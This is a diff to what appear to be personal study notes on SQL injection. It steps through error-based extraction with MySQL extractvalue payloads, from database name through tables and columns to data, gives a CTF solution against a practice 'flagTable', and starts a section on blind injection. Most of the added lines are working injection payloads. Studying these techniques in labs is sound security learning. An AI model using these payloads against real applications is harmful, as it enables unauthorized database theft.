@@ -45,7 +45,44 @@
 #    select database()
 #    ex) normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
 #  5. Table name
+#    limit(column_number, row_number)
 #    select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1
 #    select table_name from information_schema.tables where table_schema = 'database_name' limit 1,1
 #    select table_name from information_schema.tables where table_schema = 'database_name' limit 2,1
 #    normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1))) and '1'='1
+#  6. Column name
+#    select column_name from information_schema.columns where table_name = 'table_name' limit 0,1
+#    normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'table_name' limit 0,1))) and '1'='1
+#  7. Data output
+#    select name from game limit 0,1
+#    normaltic' and extractvalue('1', concat(0x3a,(select name from game limit 0,1))) and '1'='1
+
+# CTF - SQL Injection (Error Based SQLi Basic)
+#  1. Find SQL Point
+#  2. Output function of error
+#  3. Create attack format
+#  4. Output of DB name: errSqli
+#    normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
+#  5. Table name: flagTable
+#    normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'errSqli' limit 0,1))) and '1'='1
+#  6. Column name: flag
+#    normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flagTable' limit 1,1))) and '1'='1
+#  7. Data output
+#    normaltic' and extractvalue('1', concat(0x3a,(select flag from flagTable limit 0,1))) and '1'='1
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+# Part 3. Blind-based SQL Injection Process
+#   - Display output of SQL injection result: Union SQL Injection
+#   - Display error message: Error-based SQL injection
+#   - Not display error message: Blind-based SQL injection
+#      1) Log-in page
+#      2) ID double check
+#      = Response difference between True or False 
+#      ex) normaltic' and '1' = '1            => ID exists
+#      ex) normaltic' and '1' = '2            => ID doesn't exist
+#      ex) normaltic' and ('1' = '1') and '1' = '1
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+#
